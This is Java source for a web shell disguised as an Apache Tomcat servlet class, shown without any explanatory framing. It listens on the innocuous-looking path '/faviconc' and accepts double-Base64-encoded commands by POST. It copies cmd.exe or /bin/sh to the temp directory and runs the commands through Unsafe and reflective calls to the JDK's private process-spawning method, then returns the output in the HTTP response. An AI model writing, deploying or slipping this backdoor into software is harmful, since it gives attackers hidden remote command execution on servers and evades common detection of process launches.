package org.apache.catalina.servlets.sl;

import org.apache.catalina.servlets.redefine.MyRequest;
import org.apache.catalina.servlets.redefine.MyResponse;
import org.apache.catalina.servlets.redefine.MyServletOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class C {
    private static final String pathPattern= "/faviconc";

    static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    private static Map startc(String[] strs) throws Exception {

        Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]{-1, -1, -1};
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField      = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        });

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        java.io.InputStream in = (java.io.InputStream) getInputStreamMethod.invoke(processObject);



        Method getErrorStream = processClass.getMethod("getErrorStream");
        getErrorStream.setAccessible(true);
        java.io.InputStream err = (java.io.InputStream) getErrorStream.invoke(processObject);
        Map Stream = new HashMap<>();
        Stream.put("InputStream",in);
        Stream.put("ErrorStream",err);
        return Stream;
    }

    private static void copyFileUsingFileStreams(java.io.File source, java.io.File dest) throws java.io.IOException {
        java.io.InputStream input = null;
        java.io.OutputStream output = null;
        try {
            input = new java.io.FileInputStream(source);
            output = new java.io.FileOutputStream(dest);
            byte[] buf = new byte[1024];
            int bytesRead;
            while ((bytesRead = input.read(buf)) > 0) {
                output.write(buf, 0, bytesRead);
            }
        } finally {
            input.close();
            output.close();
        }
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }
    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                java.util.Map objMap = (java.util.Map)obj;
                Object request = objMap.get("request");
                Object response = objMap.get("response");
                String tmpdir = System.getProperty("java.io.tmpdir");
                String osName = System.getProperty("os.name");
                java.io.File source;
                java.io.File dest;
                String cp;
                if (osName.startsWith("Windows")){
                    source = new java.io.File("C:\\Windows\\System32\\cmd.exe");
                    dest = new java.io.File(tmpdir + java.io.File.separator + "c.exe");
                    cp = "/c";
                }else {
                    source = new java.io.File("/bin/sh");
                    dest = new java.io.File(tmpdir + java.io.File.separator + "s");
                    cp = "-c";
                }

                try {
                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                    copyFileUsingFileStreams(source,dest);
                    boolean exists = dest.exists();
                    byte[] cc = r(in);
                    if (cc.length == 0) {
                        cc = MyRequest.getParameter(request,"c").getBytes(StandardCharsets.UTF_8);
                    }
                    if (cc.length == 0) {
                        return;
                    }
                    String c = new String(cc);
                    if (c.startsWith("c=")){
                        c = c.substring(2);
                    }
                    if (exists) {
                        dest.setExecutable(true);
                        try {
                            Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                            Object Decoder = Base64.newInstance();
                            cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{c});
                            cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                        } catch (Throwable ex)
                        {
                            Class Base64 = loader.loadClass("java.util.Base64");
                            Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                            cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{c});
                            cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                        }
                        java.io.InputStream OutStream;
                        java.io.InputStream ErrorStream;
                        StringBuilder outBuilder = new StringBuilder();
                        StringBuilder errBuilder = new StringBuilder();
                        int i;
                        Map Stream = startc(new String[] { dest.getCanonicalPath(), cp, new String(cc)});
                        OutStream = (InputStream) Stream.get("InputStream");
                        ErrorStream = (InputStream) Stream.get("ErrorStream");
                        while ((i = OutStream.read()) != -1)
                            outBuilder.append((char)i);
                        while ((i = ErrorStream.read()) != -1)
                            errBuilder.append((char)i);
                        if (outBuilder.length() == 0 && errBuilder.length() == 0){
                            String[] command;
                            if (osName.startsWith("Windows")) {
                                command = new String[]{"cmd.exe", "/c", new String(cc)};
                            } else {
                                command = new String[]{"/bin/sh", "-c", new String(cc)};
                            }
                            Stream = startc(command);
                            OutStream = (InputStream) Stream.get("InputStream");
                            ErrorStream = (InputStream) Stream.get("ErrorStream");
                            while ((i = OutStream.read()) != -1)
                                outBuilder.append((char)i);
                            while ((i = ErrorStream.read()) != -1)
                                errBuilder.append((char)i);
                        }
                        OutStream.close();
                        ErrorStream.close();
                        StringBuilder builder = outBuilder;
                        if (errBuilder.length() != 0){
                            builder = errBuilder;
                        }
                        java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                        MyServletOutputStream.write(so, builder.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, builder.length());
                        MyServletOutputStream.flush(so);
                        MyServletOutputStream.close(so);
                    }
                } catch (Exception e) {
                    try {
                        java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                        MyServletOutputStream.write(so, e.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, e.toString().length());
                        MyServletOutputStream.flush(so);
                        MyServletOutputStream.close(so);
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }
}
